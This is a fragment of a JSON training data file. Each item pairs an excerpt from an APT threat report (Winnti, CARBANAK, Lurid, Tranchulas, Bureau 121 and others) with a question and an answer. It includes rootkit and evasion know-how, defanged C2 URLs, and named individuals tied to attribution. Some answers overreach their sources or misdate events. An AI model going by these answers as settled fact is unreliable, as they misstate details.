    "instruction": "Medium Headline: Control DLL\nThe winmm.dll malicious library maintains another library in its body, which is decrypted and loaded into the process memory without creating any files on local disk. According to file version info the original name of this library is \"PlusDLL.dll\". This is the platform's main control component. When the additional DLL has been properly allocated in the memory, winmm.dll passes control to it with a parameter \u2013 a string which contains bot settings. The settings string, in encrypted form, is also located in the winmm.dll body \u2013 after the magic word \"PLUSUNIT\".\nEncrypted bot settings\nAfter decryption, the string contains the following:\nurl=lp.gasoft.us:80|ver=1018|tag=33|group=lp80wi\nApparently, when the Winnti malware managed to get into focus of security researchers: the authors made modifications of the methods used to store these initial settings. In some samples, the settings were hidden even in the executable file's header:\nEncrypted settings in the header of malicious executable\nIn other variants, the 'PLUSUNIT' magic string was modified:\nUUUSUN\"\" instead of PLUSUNIT\nThe PlusDLL library has an embedded driver. The driver is stored in %WINDIR%\\System32\\<drivername.sys> file, registered as a service and started by NtLoadDriver system API function. Immediately after that, the driver's file is removed, as well as all the registry entries created during service registration. The executable preserved the original driver names which are \"PortLess\" and \"PointFilter\"; however, the driver files used during infection are saved as \"sp1itter.sys\" and \"acplec.sys\".\nThe purpose of the driver is to hide network connections established by the malware. For example, if the user decides to check a list of established connections (e.g., using the 'netstat \u2013a' command or the tcpview program) while the bot is communicating to the control center, the driver will protect and hide the malware connections. This approach is used by many rootkits on the Windows platform.\nThe driver uses an interesting method to get the list of addresses to protect connections with. This information is available in the PlusDLL control library, which normally operates in the context of the explorer.exe process when the infection is active on the computer. The address information is sent from the user space (from PlusDLL) to the kernel space, where the driver works, via call to NtSetQuotaInformationFile API function.\nDuring initialization, the driver hooks the NtSetQuotaInformationFile function:\nHook on NtSetQuotaInformationFile function\nEvery time the function is called, the driver checks its parameters: to be precise it is HANDLE FileHandle and PVOID Buffer parameters.\nThe FileHandle parameter holds a descriptor of the partition on the hard drive where the function is expected to set disk quotas.\nThe Buffer parameter is a memory buffer with information of new quotas to be set. The driver checks whether the value of the FileHandle parameter is equal to minus two. When the system calls the NtSetQuotaInformationFile function to actually change the quotas, the descriptor must be associated with one of the disks. Normally such descriptors in the Windows system are positive integers which obviously means that it cannot be equal to minus two. The negative value is set by the PlusDLL library in order to make the driver detect that the NtSetQuotaInformationFile function was called by that library. When calling NtSetQuotaInformationFile, PlusDLL sends information about the network addresses to be protected by the driver via the Buffer parameter. If FileHandle is not equal to minus two, the hook function in the driver passes control to system's original code of NtSetQuoataInformationFile API function and everyhin works as it should be on an uninfected system.\nSending data from the PlusDLL.dll library to the sp1itter.sys driver\nNote that 64-bit versions of Windows do not allow unsigned drivers to run. The malicious driver's 64-bit versions were signed using stolen certificates. During the time that we have been tracking the Winnti group, we found 11 certificates that were used to sign the malware used by the group (not necessarily drivers only). Ten of them belong to various companies in the gaming industry.\n\nBased on the above text, answer a question. What measures does the Winnti group take to ensure that their malicious drivers can operate on 64-bit versions of Windows, given that unsigned drivers are not allowed to run on these systems? Explain the significance of this approach in the context of the group's operations.",
    "output": "The Winnti group employs stolen digital certificates to sign their malicious drivers, allowing them to operate on 64-bit versions of Windows. Since 64-bit Windows systems enforce strict policies against unsigned drivers, the use of valid digital signatures is crucial for the malware to execute successfully. Over the course of tracking the Winnti group, researchers have identified 11 different certificates used to sign the malware, with ten of these certificates belonging to various companies in the gaming industry. This approach underscores the sophistication of the Winnti group, as they not only develop advanced malware but also go to great lengths to ensure that their tools can bypass security mechanisms, thereby increasing the effectiveness and stealth of their cyber-attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Threat Research\nApril 23, 2019 | by ,\nUpdate (April 30): Following the release of our four-part CARBANAK Week blog series, many readers have found places to make the data shared in these posts actionable. We have updated this post to include some of this information.\nIn the , we wrote about how string hashing was used in CARBANAK to manage Windows API resolution throughout the entire codebase. But the authors used this same string hashing algorithm for another task as well. In this installment, we'll pick up where we left off and write about CARBANAK's antivirus (AV) detection, AV evasion, authorship artifacts, exploits, secrets, and network-based indicators.\n\nBased on the above text, answer a question. How did the authors of CARBANAK use string hashing beyond managing Windows API resolution, and what additional tasks did it facilitate within the malware?",
    "output": "The authors of CARBANAK employed string hashing not only for managing Windows API resolution but also for another significant task. Specifically, they utilized the same string hashing algorithm for antivirus (AV) detection and AV evasion. This dual-purpose application of string hashing showcases the sophisticated nature of the malware, enabling it to both resolve necessary APIs dynamically and evade detection mechanisms implemented by antivirus software.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: COMPROMISED ORGANIZATIONS\nAfter mapping out and monitoring the command and control network used in this campaign we were able to retrieve a listing of the compromised computers connecting to these servers. This list of compromised computers contains 1465 unique hosts (Hostname + Mac address as stored by the C&C) with 2272 unique external IP addresses connecting to the command and control network primarily from Russia (1063), Kazakhstan (325) and Ukraine (102) along with numerous other countries in the CIS (former Soviet Union). There were also significant numbers of compromises in Vietnam, India, Mongolia and China. In total, there were victims in 61 different countries.\nThe data covers compromised computers that connected to the command and control servers in June and July 2011. The top 10 countries of victims (based on the 2272 IP addresses) are:\nBig Headline: MALWARE CAMPAIGNS\nAs noted earlier, there is a unique identifier built in to instances of the malware sent out by the attackers that allows them to keep track of the computers compromised by specific campaigns. In total, we found 301 campaign codes. This means that the attackers sent out at least 301 different instances of the \"Lurid Downloader.\" There are high concentrations of victims within a single country for each instance of the malware campaign indicating that the distribution of the malware is targeted at specific countries or regions.\nThere were also specific campaigns that affected a very small number of victims. In fact, nearly 60% (59.4%) of all the campaigns affected only 1 or 2 victims. There were 115 campaigns that only compromised 1 victim and 64 campaigns that only compromised 2 victims. This indicates the precision in malware campaigns that target specific entities.\nBig Headline: DATA EX-FILTRATION\nWhile we were unable to recover the data obtained by the attackers, we were able to collect some of the command issued by the attackers that hint at their objectives. We found that the attackers often issued the \"LS\" command to send a directory listing from specific directories on the compromised computers back to the command and control server. We also observed the use of the \"SEND FILE\" that ordered the compromised computers to compress, split and upload specific files (.rar, .xls, .doc) to the command and control server. However, we were unable to recover the ex-filtrated data.\nBig Headline: ATTRIBUTION\nDetermining who is ultimately behind targeted malware attacks is difficult as it requires a combination of technical and contextual analysis and the ability to connect disparate pieces of information together over a period of time. Moreover, any one researcher typically does not necessarily have all these pieces of information and must interpret the available evidence. Too often, the determination of attribution is based on easily spoofed evidence such as IP addresses. While many of these attacks are attributed to China, in this case, the IP addresses of the command and control servers were located in the United States and the United Kingdom. However, the registration information of the domain names used indicates that the owners are in China. In either case, the information is not difficult to manipulate.\nThe use of \"Enfal\", the family of malware to which \"Lurid Downloader\" belongs, has been historically linked with threat actors in China. In this case, the attack vector that we were able to analyze was related to the Tibetan community which indicates an association with China. However, China was also a victim of \"Lurid Downloader.\"\nBig Headline: CONCLUSION\nIn this report we have analyzed targeted malware attacks that have compromised sensitive locations in Russia, CIS countries and around the world. The focus of the attacks appears to be on government networks and diplomatic missions as well and research institutions and space related agencies. We found that the attackers engaged in over 300 campaigns and kept careful records of their victims and to what campaign compromised them. Our analysis of the campaigns reveals that attackers engage in attacks that target communities in specific geographic locations as well extremely targeted campaigns that only affect one or two victims.\nThe precise nature of targeted malware attacks increases the difficulty of defense. With significant reconnaissance, and possibly information gained from previously successful incursions into the target's network, the threat actors behind targeted malware attacks are able to customize their attacks to increase the probability of success. Therefore, defenses against targeted malware attacks need to focus on detection and mitigation and not simply on prevention.\nThrough the exposure of the \"Lurid Downloader\" network, we aim to enable a better understanding of the extent and frequency of such attacks as well as the challenges that targeted malware attacks pose for traditional defenses. Defensive strategies can be dramatically improved by understanding how targeted malware attacks work as well as trends in the tools, tactics and procedures of the threat actors behind such attacks. By effectively using threat intelligence derived from external and internal sources combined with security tools that empower human analysts, organizations are better positioned to detect and mitigate targeted malware attacks.\nMedium Headline: TREND MICRO\u2122\nTrend Micro Incorporated is a pioneer in secure content and threat management. Founded in 1988, Trend Micro provides individuals and organizations of all sizes with award-winning security software, hardware, and services. With headquarters in Tokyo and operations in more than 30 countries, Trend Micro solutions are sold through corporate and value-added resellers and service providers worldwide. For additional information and evaluation copies of Trend Micro products and services, visit our website at www.trendmicro.com.\n\nHow did the 'Lurid Downloader' attackers manage to track the success of their malware campaigns, and what insights can be drawn from the distribution of these campaigns?",
    "output": "The 'Lurid Downloader' attackers embedded unique identifiers, known as campaign codes, into each instance of the malware they distributed. This allowed them to track the success of specific campaigns. The analysis revealed 301 different campaign codes, indicating that the attackers sent out at least 301 distinct instances of the malware. The distribution of these campaigns showed high concentrations of victims within single countries, suggesting that the malware was targeted at specific geographic regions. Additionally, nearly 60% of the campaigns affected only one or two victims, highlighting the precision with which these campaigns were conducted. This level of specificity suggests that the attackers had significant reconnaissance capabilities and possibly leveraged information from previous successful incursions to tailor their attacks for maximum effectiveness.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Significant Malware Artifacts:\nOperational Caveat: It is important to note that there are information gaps which diminish our ability to establish a definitive explanation for the malicious activity and identify the responsible entities behind the authorship and use of the identified malware. Below the TCIRT simply highlights the facts associated with specific artifacts identified within the malware.\nMost of the dropped malware binaries contained a debug string that sheds light on the possible developers and operators of the malware.\nThe significance of the username Tranchulas within the debug path of the winsocks.exe binary is that Tranchulas is a Pakistani information security consulting company with offices in the United Kingdom, United States, and Pakistan. The CEO of Tranchulas is Zubair Khan, a Pakistani national and information security executive who has \"been researching mainly on [sic] cyber warfare\". Khan also likely maintains a close relationship to the Pakistani government. According to this online biography, he is responsible for the penetration testing of Pakistani homeland security solutions and has consulted for the Pakistani National Database and Registration Authority (NADRA).\nProximity to such sensitive security programs suggest a certain level of trust on behalf of the Pakistani government, and may indicate that official Pakistani entities could have access to Tranchulas technical support for various security projects or programs. An ironic, yet noteworthy observation is that the Tranchulas website boasts Telenor as a client.\nTranchulas also serves as an official sponsor for the Pakistan CERT in addition to maintaining the official Pakistan CERT website (cert.org.pk).\nOn July 2, 2013 a similar file windefender.exe (MD5: a21f2cb65a3467925c1615794cce7581) was identified containing a strong association to Tranchulas. This particular binary contained the following debug string:\nC:\\Users\\umairaziz27\\Documents\\Visual Studio 2008\\Projects\\usb\\Release\\usb.pdb\nThe username \"UmairAziz27\" reveals a Twitter account @umairaziz27 for an \"Optimistic Patriot by choice\" who is \"Working as InfoSec Analyst at @Tranchulas.\"\nUmair Aziz (umairaziz27) maintains a LinkedIn professional profile that highlights his employment at Tranchulas and reveals that he was educated at the National University of Sciences and Technology School of Electrical Engineering and Computer Science (NUST-SEECS) in Pakistan.\nA second host within the same 199.91.173[.]40/29 subnet was also identified hosting similar zipped malware at [http://]199.91.173[.]45/OBL_Leaked_Report.zip and [http://]199.91.173[.]45/Naxalites_Funded_By_Pakistan.zip. The OBL_Leaked_Report.zip contained a .scr file that drops a decoy document pertaining to the alleged incompetence of Pakistani authorities in locating Osama Bin Laden (OBL).\nThis OBL malware drops a windefender.exe backdoor component (MD5: 35663e66d02e889d35aa5608c61795eb) In this case, the debug string is:\nC:\\Users\\Cert-India\\Documents\\Visual Studio 2008\\Projects\\ufile\\Release\\ufile.pdb.\nThe binaries that contain the \"umairaziz27\u02ba\u2033 and \"Cert-India\" debug strings are designed to call back to [http://]199.91.173[.]45/fetch_updates_8765_tb.php? compname=<COMPUTERNAME> and [http://]199.91.173[.]45/is_array.php?compname=<COMPUTERNAME>. Meanwhile, the Naxalites_Funded_By_Pakistan.scr file drops a slightly different malware component and an alternate decoy document.\nThe dropped implant, showppt.scr (MD5: 165ac370b54e664812e4c15b2396ccd6), is a downloader that connects to [http://]199.91.173[.]45/ and downloads both legitimate library files and malicious second stage binaries.\nAnswer this question: What is the significance of the username 'Tranchulas' found in the debug path of the winsocks.exe binary in the context of the India_Pak_Tranchulas APT report? How does this information shed light on the potential developers and operators of the malware?",
    "output": "The username 'Tranchulas' in the debug path of the winsocks.exe binary is significant because Tranchulas is a Pakistani information security consulting company with offices in the United Kingdom, United States, and Pakistan. The CEO of Tranchulas, Zubair Khan, is a Pakistani national known for researching cyber warfare and has close ties to the Pakistani government. Khan has been involved in penetration testing of Pakistani homeland security solutions and has consulted for the Pakistani National Database and Registration Authority (NADRA). This proximity suggests a level of trust between Tranchulas and the Pakistani government, indicating that official Pakistani entities might have access to Tranchulas' technical support for various security projects or programs. Additionally, Tranchulas serves as an official sponsor for the Pakistan CERT and maintains its official website, further highlighting its involvement in critical security infrastructure.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 4.6.2 Host Visibility and Indicators\nThis section discusses the methodology and RSA NetWitness Endpoint Instant IOCs (IIOCs) and content used by RSA IR during this investigation. The methodology used in this section is described in detail in the RSA NetWitness Endpoint User Guide found here.18\nThe CARBANAK actors involved during this engagement were particularly careful to leave as little file, log or execution traces as possible. This included, but was not limited to, ad hoc download of tools as needed, preference for lateral tool movement, log deletion automatically built into tools, immediate deletion of tools and logs upon logout of systems, and removal of entries from centralized log repositories.\nDuring this engagement, the RSA NetWitness Endpoint agent was deployed to all Red Hat Enterprise Linux (RHEL) and CentOS 6 and 7 systems, as they could support it. The detection of attacker activity on these systems within RSA NetWitness Endpoint utilized aspects of the attacker actions and toolset utilizations that deviated from legitimate installed binary usage. An example of this is the usage of the AUDITUNNEL and the SSHDOOR client and server binaries. Originally, the attackers placed the SSHDOOR binaries in /usr/bin and /usr/sbin as a replacement for the system OpenSSH client and server binaries. However, upon the remediation of system ALPHA, the attackers utilized the SSHDOOR binaries in the non-standard location of /usr/share/ man/mann. The initial placement of SSHDOOR was observed by reviewing any binaries automatically started as part of systemd or init.d, and had a hash value that didn't match the one in the RPM package list. These attributes are recorded in the IIOCs of RSA NetWitness Endpoint and are shown in the SSHDOOR detection in Figure 40.\n18 \"RSA NetWitness Endpoint User Guide\";\nOnce the attackers moved to a non-standard location, this was easily identified, as they were the only common system service binaries not running in either /sbin or /usr/sbin. The aspects of both instances of SSHDOOR use are illustrated in Figure 41.\nIn Figure 41, we observe two separate sshd binaries running on the system. As SSH only requires one instance of its service binary running at a time, this is an anomaly. Add to this the non-standard location of /usr/share/man/ mann in which the second sshd is executing, and the fact that this binary cannot be associated with a legitimately installed RPM package, this activity immediately becomes suspect and warrants investigation. The legitimate sshd service binary process is also highlighted as running from /usr/sbin.\nAnother method of identifying the attacker activity during this engagement involved the command line arguments used by the attackers. Essentially, while the attackers could change directory locations, filenames and even hashes, the base functionality of the tools themselves could not readily or easily be changed. Given that the command line arguments of the tool indicated the functionality being utilized, RSA IR analysts zeroed in on the unique command line arguments of the tools being use by the attackers. As an example, the usage of any web address or IP address in the command line arguments became immediately suspect and reviewed, as shown in Figure 42.\nAs a follow-up to these findings, RSA IR analysts utilized some of the base functions of the RSA NetWitness Endpoint agent in order to gain additional artifacts and information associated with known indicators. During this engagement, the directory /usr/share/man/mann was the primary working directory for system BRAVO. In using this indicator during scoping investigations, the file contents for /usr/share/man/mann were requested from every Linux server in the environment. The purpose of this was to determine if this directory was being maliciously used on any systems within the environment and to gain additional evidence that may not have executed during the agent's tenure on the system.\nIn requesting files for this directory across all systems, analysts are able to determine if there are additional tools or malware artifacts used by the attackers within the same directory. Additionally, this action can also determine if the binaries observed executing from this directory exist on any other systems. Both cases are shown in the results of this action from the Global Downloads section shown in Figure 44.\nThe functionality is also useful in acquiring key host artifacts, such as configuration files and host logs, across all systems within the environment and then processing and reviewing them in aggregate in order to gain more contextual information and situational awareness.\nWhile contextual forensic data within host artifacts could identify some attacker activity, much of the most commonly utilized host forensic data either was not useful or was not available on the hosts affected during this engagement. While aggregate analysis of artifacts, such as NTFS Master File Tables, AmCache, SYSTEM and SOFTWARE Registry Hives, and Windows Event Logs, could identify certain aspects of the attackers' actions, they were consistently ineffective at providing the necessary level of granularity to track the attackers' actions appropriately. However, using the RSA NetWitness Endpoint agent already present on the hosts to provide this critical host data, the aforementioned artifacts became force multipliers by providing additional context to the actions observed in RSA NetWitness Suite.\nThe attackers utilized a specific staging directory on each host in which they took any significant action. In order to appear more legitimate to security analysts and tools, they utilized the legitimate Microsoft Windows directory for 32-bit applications utilizing the Taiwan Chinese language pack on 64-bit versions of Windows, C:\\Windows\\SysWoW64\\zh-TW. While this directory is a legitimate Windows system directory, no server systems within this environment were legitimately utilizing the Taiwan Chinese language directory. As such, this became a useful and actionable IOC for scoping and tracking any systems with substantial actor activity. An example of attacker use of this directory, as observed in RSA NetWitness Endpoint, is shown in Figure 45.\nIn Figure 45 above, the usage of the UIAutomationCore.dll.bin WGET binary to download attacker tools and the immediate renaming of those tools are shown. This, again, became an excellent actionable IOC to track adversary activity. The same contextual aspects that were utilized in the network IOC for WGET usage in Figure 33 are also used here. By identifying any command executions that utilize a command line argument of 'http://' followed by an IP address, RSA IR was able to identify any and all instances in which the attackers downloaded tools. In hunting for this activity, we use the same methodology used in Section 3.3.1, identifying aspects of the activity associated with IIOCs and reviewing those IIOCs for activity. In this case, the UIAutomationCore.dll.bin WGET binary download is an unsigned module, located within a legitimate Windows directory, communicates to an external source directly to IP address and writes an executable to disk. The IIOCs shown in Figure 46 reflect this activity.\nAs stated in the section associated with Table 15, the TINYP binary is a modification of the SysInternals PSEXEC remote access utility. Just like PSEXEC, the TINYP binary sends a service binary to the ADMIN$ share (C:\\ Windows) of the target host. The target host executes this service binary, and the TINYP tool connects to that service binary. When identifying attacker lateral movement from the perspective of the target system, the PSEXESVC. exe TINYP service binary executes the remote command requested by the attacker system. The view of this activity in RSA NetWitness Endpoint is illustrated in Figure 47.\nFigure 47 illustrates the most common use case for the TINYP binary observed: lateral movement via remote command shell execution. In the figure above, the source host perspective of TINYP execution is shown in the red boxes, while the target host perspective of TINYP execution is shown in the blue boxes. In the box labeled \"1,\" we see file PSEXESVC.exe service binary being written to the C:\\Windows directory, which represents the ADMIN$ SMB/CIFS network share. Once the service binary is placed in the ADMIN$ share, a Windows Registry entry is created in the SYSTEM Registry Hive under the path HKLM\\SYSTEM\\ControlSet001\\services\\PSEXESVC. Once the service binary is placed on the system, a Windows Service is created to execute the service binary. This is observed in the last item in box \"1,\" as the Windows Services Control Manager services.exe executes the PSEXESVC.exe process.\nUpon the second execution of the TINYP binary, the Windows SYSTEM Registry Key is not created, as it already exists on the system, and it is important to note that the Registry entry is only created on the first execution. This information can be used to determine the first host access by this method. On the second execution, represented by the box labeled \"2,\" we see the Windows Local Security Authentication Server binary lsass. exe opening the PSEXESVC.exe service process. This is the actor attempting to authenticate to the remote system under whatever credentials they have acquired. Once authenticated, the process goes into the box labeled \"3,\" where the PSEXESVC.exe service binary executes the Windows Command Processor cmd.exe remotely on behalf of the attacker. It is important to note that while the calling parent binary on the target system is the TINYP binary ps.exe, all actions executed by TINYP will be carried out by the PSEXESVC. exe service binary on the target system. Given this, we can identify remote command shell execution via PSEXEC for any instance in which PSEXESVC.exe Creates Process cmd.exe, which we established was the primary use case for this tool in this engagement.\nQ: How did RSA IR leverage command line arguments to identify attacker activity, and what specific actions were taken based on these findings?",
    "output": "RSA IR analysts focused on the unique command line arguments of the tools used by the attackers, as these arguments indicated the functionality being utilized. For example, any command line arguments that included a web address or IP address became immediately suspect and were reviewed. Following these findings, RSA IR analysts used the RSA NetWitness Endpoint agent to request file contents for the directory /usr/share/man/mann from every Linux server in the environment. This helped determine if this directory was being maliciously used on any systems and to gather additional evidence that might not have executed during the agent's tenure on the system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Browser exploits\nFigure 37. Browser exploits detected and blocked by Microsoft real-time antimalware products, 3Q14\u20132Q15\n\uf0b7 Exploits targeting (<http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-7331>)CVE-2013-7331, a vulnerability affecting the Microsoft.XMLDOM ActiveX control in Internet Explorer, accounted for the largest share of browser-related exploits encountered in 1H15. Exploiting this vulnerability allows an attacker to confirm the existence or nonexistence of arbitrarily specified paths and hostnames in the local environment. Microsoft published Security Bulletin (<https://technet.microsoft.com/library/security/ms14-052>)MS14-052 in September 2014 to address the issue.\n\uf0b7 Exploits targeting vulnerabilities addressed by Security Bulletin (<https://technet.microsoft.com/library/security/ms09-002>)MS09-002, published by Microsoft in February 2009, accounted for the second largest share of browser-related exploits encountered in 1H15. Of these, most targeted (<http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0075>)CVE-2009-0075, an uninitialized memory corruption vulnerability in Internet Explorer 7.\n\uf0b7 Encounters involving exploits targeting (<http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2551>)CVE-2013-2551, a use-after-free vulnerability in versions 6 through 10 of Internet Explorer, accounted for the largest share of browser-related exploit encounters in 2H14, then fell to negligible levels in 1H15 as exploit kit authors dropped them in favor of exploits targeting CVE-2013-7331.\nMedium Headline: Exploit detection with Internet Explorer and IExtensionValidation\nIExtensionValidation is an interface introduced in Internet Explorer 11 that real-time security software can implement to block ActiveX controls from loading on malicious pages. When Internet Explorer loads a webpage that includes ActiveX controls, if the security software has implemented IExtensionValidation, the browser calls the security software to scan the HTML and script content on the page before loading the controls themselves. If the security software determines that the page is malicious (for example, if it identifies the page as an exploit kit landing page), it can direct Internet Explorer to prevent individual controls or the entire page from loading.\nFigure 38. Internet Explorer 11 can block pages that contain ActiveX controls if security software determines that the page is malicious\nFigure 39. ActiveX controls detected on malicious webpages through IExtensionValidation, 3Q14\u20132Q15, by control type\n\uf0b7 Adobe Flash Player objects were the most commonly detected type of object hosted on malicious pages in each of the past four quarters.\nAdobe Flash objects were the most commonly detected type of object hosted on malicious pages.\n\uf0b7 After accounting for a high of 45.3 percent of object detections in 3Q14, detections of Java applets on malicious pages decreased to just 0.5 percent of detections by 2Q15. A number of changes that have been made to Java and Internet Explorer over the past two years have made it much more difficult for attackers to take advantage of Java-based vulnerabilities, which is the most likely explanation for this significant decrease. (See (<>)\"Java exploits\" on page (<>)47 for more information.)\n\uf0b7 Silverlight, Adobe Reader, and other malicious objects each accounted for less than 3 percent of object detections each quarter.\nMedium Headline: Exploits used in targeted attacks\nA targeted attack is an attack against the computers or networks of a specific group of companies or individuals. This type of attack usually attempts to gain access to the computer or network before trying to steal information or disrupt the infected computers. (<>)Figure 40 lists some of the exploits Microsoft has observed being used in targeted attacks in 1H15.\nSee the entry (<http://blogs.microsoft.com/cybertrust/2013/06/13/targeted-attacks-video-series/>)\"Targeted Attacks Video Series\" (June 13, 2013) on the Microsoft Cyber Trust blog at blogs.microsoft.com/cybertrust for an informative series of videos and papers about targeted attacks, the techniques used by attackers, and some of the steps that organizations can take to secure their networks against targeted attacks.\nBig Headline: Malware and unwanted software\nMost attempts by malware to infect computers are unsuccessful. More than three-quarters of Internet-connected personal computers worldwide are protected by real-time security software that constantly monitors the computers and network traffic for threats and blocks them before they can infect the computers, if possible. Therefore, a comprehensive understanding of the malware landscape requires consideration of infection attempts that are blocked as well as infections that are removed.\nMicrosoft uses two different metrics to measure malware and unwanted software prevalence:16\n\uf0b7 Encounter rate is simply the percentage of computers running Microsoft real-time security products that report a malware encounter.17 For example, the encounter rate for the malware family (<http://www.microsoft.com/security/portal/threat/encyclopedia/search.aspx?query=JS/Bondat>)JS/Bondat in Mexico in 2Q15 was 4.2 percent. This data means that, of the computers in Mexico that were running Microsoft real-time security software in 2Q15, 4.2 percent reported encountering the Bondat family, and 95.8 percent did not. Encountering a threat does not mean the computer has been infected. Only computers whose users have opted in to provide data to Microsoft are considered when calculating encounter rates.18\n16 Microsoft regularly reviews and refines its data collection methodology to improve its scope and accuracy. For this reason, the statistics presented in this volume of the Microsoft Security Intelligence Report may differ slightly from comparable statistics in previous volumes.\n17 Encounter rate does not include threats that are blocked by a web browser before being detected by antimalware software. In particular, IExtensionValidation in Internet Explorer 11 enables security software to block pages that contain exploits from loading. (See (<>)\"Exploit detection with Internet Explorer and (<>)IExtensionValidation\" on page (<>)55 for information about IExtensionValidation and the threats it blocks.) For this reason, encounter rate figures may not fully reflect all of the threats encountered by computer users.\n18 For information about the products and services that provide data for this report, see (<>)\"Appendix B: Data (<>)sources\" on page (<>)129.\n\uf0b7 Computers cleaned per mille, or CCM, is an infection rate metric that is defined as the number of computers cleaned for every 1,000 unique computers that run the Malicious Software Removal Tool (MSRT), a free tool distributed through Microsoft update services that removes more than 200 highly prevalent or serious threats from computers. Because it is not a real-time tool, the MSRT only detects and removes threats that are already present on the computer; it does not block infection attempts as they happen.\nFigure 41. Worldwide encounter and infection rates, 2Q14\u20132Q15, by quarter\nAs (<>)Figure 41 shows, and as one would expect, malware encounters are much more common than malware infections. On average, about 17.0 percent of reporting computers worldwide encountered malware over the past four quarters. At the same time, the MSRT removed malware from about 7.1 out of every 1,000 computers, or 0.71 percent. Together, encounter and infection rate information can help provide a broader picture of the malware landscape by offering different perspectives on how malware propagates and how computers get infected.\nBrantall, Rotbrow, and Filcout\nWhere noted, the figures in this report omit detections of (<http://www.microsoft.com/security/portal/threat/encyclopedia/search.aspx?query=Win32/Brantall>)Win32/Brantall, (<http://www.microsoft.com/security/portal/threat/encyclopedia/search.aspx?query=Win32/Rotbrow>)Win32/Rotbrow, and (<http://www.microsoft.com/security/portal/threat/encyclopedia/search.aspx?query=Win32/Filcout>)Win32/Filcout. These three families were involved in an incident in which a rogue developer with access to commercial source code modified the source code to serve as a stealth distribution method for malware without being detected by major security software vendors. When the modification was discovered, it resulted in a significant installed base of commercial software being reclassified as malicious, which had an outsized effect on infection rates. Microsoft believes that the unmodified infection and encounter figures do not create an accurate picture of the worldwide threat landscape over the past year and a half. As a result, totals for the Brantall, Filcout, and Rotbrow families have been removed from the infection and encounter figures presented here where appropriate, as noted.\nSee \"The Sefnit saga: a timeline\" on pages 57\u201364 of (<http://www.microsoft.com/download/details.aspx?id=44937>)Microsoft Security available from the Microsoft Download Center, for a more in-depth explanation of the incident, along with detection statistics and a timeline of events.\nRead the text above and answer this question: What are the two primary metrics used by Microsoft to measure malware and unwanted software prevalence, and how do they differ in their approach to measuring threats?",
    "output": "Microsoft uses two primary metrics to measure malware and unwanted software prevalence: encounter rate and computers cleaned per mille (CCM). Encounter rate is the percentage of computers running Microsoft real-time security products that report a malware encounter. This metric includes both successful and unsuccessful infection attempts. CCM, on the other hand, is an infection rate metric that measures the number of computers cleaned for every 1,000 unique computers that run the Malicious Software Removal Tool (MSRT). Unlike encounter rate, CCM only detects and removes threats that are already present on the computer and does not block infection attempts as they happen. Together, these metrics provide a broader picture of the malware landscape by offering different perspectives on how malware propagates and how computers get infected.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Summary\nNumerous targeted attack campaigns are occurring every week.  However, relative to the total number of attacks, few are fully disclosed.  These attacks are primarily targeting private industry in search of key intellectual property for competitive advantage, military institutions, and governmental organizations often in search of documents related to current political events and human rights organizations.\nThis attack campaign focused on the chemical sector with the goal of obtaining sensitive documents such as proprietary designs, formulas, and manufacturing processes.\n\nQ: In the context of the Nitro Attacks, what were the primary motivations behind the attackers targeting the chemical sector, and how did this differ from other sectors mentioned?",
    "output": "A: The primary motivation behind the Nitro Attacks targeting the chemical sector was to obtain sensitive documents such as proprietary designs, formulas, and manufacturing processes. This focus on intellectual property for competitive advantage differentiates it from attacks on other sectors. For instance, military institutions and governmental organizations were often targeted for documents related to current political events, while human rights organizations were targeted for different reasons. This highlights the strategic and economic value of the chemical sector's intellectual property to the attackers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Bureau 121/ Guardians of Peace/ Dark Seoul\nAccording to defectors, Bureau 121 is one of six divisions of North Korea's General Bureau of Reconnaissance that is charged with cyber-intelligence operations. The bureau was created in 1998 and it consists of ~1800 handpicked hackers who are allegedly the \"most talented and rewarded personnel within the North Korean military\" according to a Reuters interview with a defector known as Jang Se-yul. Students are recruited directly from the University of Automation and paid relatively significant sums.\nNorth Korea uses cyber-warfare as a cost effective intelligence branch of their military. Many in North Korea see cyber-warfare as their strongest weapon. Bureau 121 most frequently targets South Korea, Japan, and the United States. Bureau 121 targets financial institutions and media companies. In one March 2014 attack, 30,000 South Korean servers associated with banking and media broadcasting outlets were damaged. These systems were infected with DarkSeoul malware and they displayed messages claiming that they were hacked by the Whois Team. In November 2014, Sony Pictures' email server was hacked by a group claiming to be called the Guardians of Peace, in response to the upcoming release of the movie \"The Interview\" because it portrays a story and portrayal that is unflattering to Kim Jong-un. An estimated 100 terabytes of data were exfiltrated from Sony before the Wiper Trojan was used to delete the servers. The information contained emails, unreleased films, employees' personal information and financial information. Threats were also made against Sony that contained imagery reminiscent of the September 11, 2001 attacks.\nThe FBI, Obama Administration, and the NSA have attributed the Sony breach to North Korea. Members of the press and some security researchers doubt the evidence\nattributing the Sony attack to North Korea. North Korea may not have been capable of exfiltrating hundreds of terabytes of data.\nThe Whois Team and the Guardians of Peace attacks are very similar. Both attacks were relatively unsophisticated and both attacks offered a moniker of a previously unheard of group. The procedure of each attack was to install malware through phishing campaigns, steal data, lock down the infected systems, display a banner message claiming responsibility, and then using malware to wipe the system.\nQuestion: How does Bureau 121 leverage cyber-warfare as a cost-effective intelligence branch, and what are the primary targets and methods used in their high-profile attacks?",
    "output": "Answer: Bureau 121 leverages cyber-warfare as a cost-effective intelligence branch by utilizing a team of approximately 1800 highly skilled hackers. They primarily target South Korea, Japan, and the United States, focusing on financial institutions and media companies. One notable attack in March 2014 involved infecting 30,000 South Korean servers with DarkSeoul malware, which displayed messages claiming responsibility by the 'Whois Team.' Another significant incident was the November 2014 hack of Sony Pictures' email server by a group calling themselves the 'Guardians of Peace,' in response to the film 'The Interview.' This attack resulted in the exfiltration of 100 terabytes of data and the use of a Wiper Trojan to delete the servers. The FBI, Obama Administration, and NSA attributed this breach to North Korea, although some members of the press and security researchers questioned the evidence.",
